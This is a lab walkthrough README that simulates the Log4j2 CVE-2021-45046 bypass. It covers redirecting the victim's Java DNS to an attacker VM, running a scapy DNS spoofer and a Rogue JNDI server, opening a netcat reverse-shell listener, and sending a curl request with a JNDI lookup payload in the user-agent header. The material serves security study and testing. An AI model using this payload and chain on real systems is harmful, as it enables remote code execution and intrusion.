# CVE-2021-45046 Simulation

* Apache Log4j2 Thread Context Lookup Pattern vulnerable to remote code execution in certain non-default configurations
* Log4j2 version <=2.15.0

## Set Up Lab Environment

* [Victim Server](../victim/README.md)
* [Attacker Server - Rogue JNDI](../attacker/README.md)

## Update Java JNDI DNS Service (Java 7-8)

In your victim's server (Tomcat), update the `JAVA_OPTS` of the JVM to add the following [JNDI DNS service provider settings](https://docs.oracle.com/javase/7/docs/technotes/guides/net/properties.html#:~:text=sun.net.spi.nameservice.provider.%3Cn%3E%3D%3Cdefault%7Cdns%2Csun%7C...%3E):

* `sun.net.spi.nameservice.provider.<n>=<default|dns,sun|...>`: Specifies the name service provider that you can use. By default, Java will use the system configured name lookup mechanism, such as file, nis, etc. You can specify your own by setting this option. <n> takes the value of a positive number, it indicates the precedence order with a small number takes higher precendence over a bigger number. Aside from the default provider, the JDK includes a DNS provider named `dns,sun`.
* `sun.net.spi.nameservice.nameservers=<server1_ipaddr,server2_ipaddr ...>`: You can specify a comma separated list of IP addresses that point to the DNS servers you want to use. If the sun.net.spi.nameservice.nameservers property is not defined, then the provider will use any name servers already configured in the platform DNS configuration.

You can add the `JNDI DNS service provider settings` pointing to the DNS server you want to use. In my case, I set it to point to an Azure VM that I was using as the `attacker` machine with IP address `192.168.2.6`.

### Java Code

You can set the settings in your Java application before the main function. In my lab environment, I use Tomcat to host my vulnerable applications.

```
System.setProperty("sun.net.spi.nameservice.nameservers", "192.168.2.6");
System.setProperty("sun.net.spi.nameservice.provider.1", "dns,sun");
```

### Tomcat Service

If your Java application is hosted by services such as Tomcat, then you need to update the `JAVA_OPTS` environment variable defined in the service file `/etc/systemd/system/tomcat.service`:

```bash
nano /etc/systemd/system/tomcat.service
```

Your service file might have a `JAVA_OPTS` entry like the one below:

```
Environment='JAVA_OPTS=-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Djava.net.preferIPv4Stack=true -Djava.net.preferIPv4Addresses=true -Djava.awt.headless=true'
```

Add the `JNDI DNS service provider settings` pointing to the DNS server you want to use:

```bash
Environment='JAVA_OPTS=-Dsun.net.spi.nameservice.provider.1=dns,sun -Dsun.net.spi.nameservice.nameservers=192.168.2.6 -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Djava.net.preferIPv4Stack=true -Djava.net.preferIPv4Addresses=true -Djava.awt.headless=true'
```

Reload services:

```bash
systemctl daemon-reload
```

## Set up Fake DNS Resolver:

I repurposed a [basic python script](https://jasonmurray.org/posts/2020/scapydns/) to handle our Java application DNS request with our weird domain name with the  `#` character in it (e.g. `127.0.0.1#attackerbox/a`). The python script uses [scapy](https://scapy.net/) to sniff DNS traffic hitting my `attacker` vm and spoof the DNS responses.

script: [dnsSpoof.py](https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/attacker/dns-server/dnsSpoof.py)

All we need to do is run the script on the `attacker` vm and wait for DNS request coming from our victim machine hosting the vulnerable Java application with Log4j version 2.15.

```bash
apt install -y python3-pip

cd /opt/log4jshell-lab/attacker/dns-server
pip3 install -r Requirements.txt
```

```bash
python3 dnsSpoof.py --iface eth0 --srcip 192.168.2.5 --srchost ubuntu5 --dstip 192.168.2.6 --dsthosts '#ubuntu6'
```

## Initialize Rogue JNDI

The IP address of my attacker VM is `192.168.2.6`. Therefore, I start `Rogue JNDI` with the following command:

```bash
docker run --rm -ti -e PAYLOAD_IP=192.168.2.6 -p 1389:1389 -p 8888:8888 rogue-jndi
```

## Start Netcat Listener

In the same attacker server, start a netcat listener to process the reverse shell:

```bash
nc -lvnp 443
```

## Trigger JNDI Lookup -> Bypass JNDI allowedLdapHost

On my victim vm, I run the following `curl` command to trigger the bypass:

### Deserialized Payload

```bash
curl -X GET -H 'user-agent: ${jndi:ldap://127.0.0.1#ubuntu6:1389/o=tomcat}' 127.0.0.1:8080/Log4j-2.15.0-SNAPSHOT/api
```

## References

* https://securitylab.github.com/advisories/GHSL-2021-1054_GHSL-2021-1055_log4j2/
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046
* https://www.lunasec.io/docs/blog/log4j-zero-day-severity-of-cve-2021-45046-increased/
* https://twitter.com/marcioalm/status/1471740771581652995
* https://docs.oracle.com/javase/7/docs/technotes/guides/net/properties.html#:~:text=sun.net.spi.nameservice.provider.%3Cn%3E%3D%3Cdefault%7Cdns%2Csun%7C...%3E
* https://slackhacker.com/2010/07/21/how-to-set-a-custom-dns-server-with-java-system-properties/